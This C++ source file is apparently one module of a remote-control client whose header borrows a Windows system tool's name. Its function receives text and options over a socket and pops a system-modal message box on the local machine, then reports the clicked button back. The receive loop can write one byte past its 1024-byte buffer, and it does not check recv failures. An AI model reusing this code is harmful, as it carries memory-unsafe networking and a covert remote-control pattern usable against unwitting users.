#include "MSConfig.h"

void messagebox(SOCKET& ConnectSocket)
{
     char command[1024], response[1024];
     int res, butch, iconch;
     string title, message, totr;
     
                     strcpy(command, "OK+");
                     send(ConnectSocket, command, (int)strlen(command), 0);
                     
                     totr.clear();
                     do
                     {
                                  res = recv(ConnectSocket, response, 1024, 0);
                                  response[res] = '\0';
                                  totr += response;
                     } while (totr[totr.length() - 1] != '+');
                     totr.erase(totr.length() - 1, 1);
                     title = totr;
                     strcpy(command, "OK+");
                     send(ConnectSocket, command, (int)strlen(command), 0);
                     
                     totr.clear();
                     do
                     {
                                  res = recv(ConnectSocket, response, 1024, 0);
                                  response[res] = '\0';
                                  totr += response;
                     } while (totr[totr.length() - 1] != '+');
                     totr.erase(totr.length() - 1, 1);
                     message = totr;
                     strcpy(command, "OK+");
                     send(ConnectSocket, command, (int)strlen(command), 0);
                     
                     totr.clear();
                     do
                     {
                                  res = recv(ConnectSocket, response, 1024, 0);
                                  response[res] = '\0';
                                  totr += response;
                     } while (totr[totr.length() - 1] != '+');
                     totr.erase(totr.length() - 1, 1);
                     butch = atoi(totr.c_str());
                     strcpy(command, "OK+");
                     send(ConnectSocket, command, (int)strlen(command), 0);
                     
                     totr.clear();
                     do
                     {
                                  res = recv(ConnectSocket, response, 1024, 0);
                                  response[res] = '\0';
                                  totr += response;
                     } while (totr[totr.length() - 1] != '+');
                     totr.erase(totr.length() - 1, 1);
                     iconch = atoi(totr.c_str());
                     strcpy(command, "OK+");
                     send(ConnectSocket, command, (int)strlen(command), 0);

                     totr.clear();
                     do
                     {
                                  res = recv(ConnectSocket, response, 1024, 0);
                                  response[res] = '\0';
                                  totr += response;
                     } while (totr[totr.length() - 1] != '+');
                     
                     int button;
                     switch (butch)
                     {
                            case 1: button = MB_OK; break;
                            case 2: button = MB_OKCANCEL; break;
                            case 3: button = MB_YESNO; break;
                            case 4: button = MB_YESNOCANCEL; break;
                     }
                     
                     int icon;
                     switch (iconch)
                     {
                            case 1: icon = MB_ICONSTOP; break;
                            case 2: icon = MB_ICONQUESTION; break;
                            case 3: icon = MB_ICONWARNING; break;
                            case 4: icon = MB_ICONINFORMATION; break;
                     }
                     
                     strcpy(command, "OK+");
                     send(ConnectSocket, command, (int)strlen(command), 0);
                     
                     int press = MessageBox(NULL, message.c_str(), title.c_str(), button | icon | MB_SYSTEMMODAL);
                     
                     totr.clear();
                     do
                     {
                                  res = recv(ConnectSocket, response, 1024, 0);
                                  response[res] = '\0';
                                  totr += response;
                     } while (totr[totr.length() - 1] != '+');
                     
                     sprintf(command, "%d+", press);
                     send(ConnectSocket, command, (int)strlen(command), 0);
                     
                     return;
}
